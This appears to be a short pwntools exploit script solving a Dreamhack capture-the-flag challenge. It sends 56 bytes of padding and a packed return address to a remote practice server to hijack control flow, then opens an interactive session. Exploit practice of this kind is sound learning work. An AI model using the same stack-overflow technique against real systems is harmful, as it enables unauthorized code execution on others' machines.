from pwn import *
#p = process("./rao")
p = remote('host1.dreamhack.games',9160)

payload = b"A"*56 + p64(0x00000000004006aa)
p.sendline(payload)
p.interactive()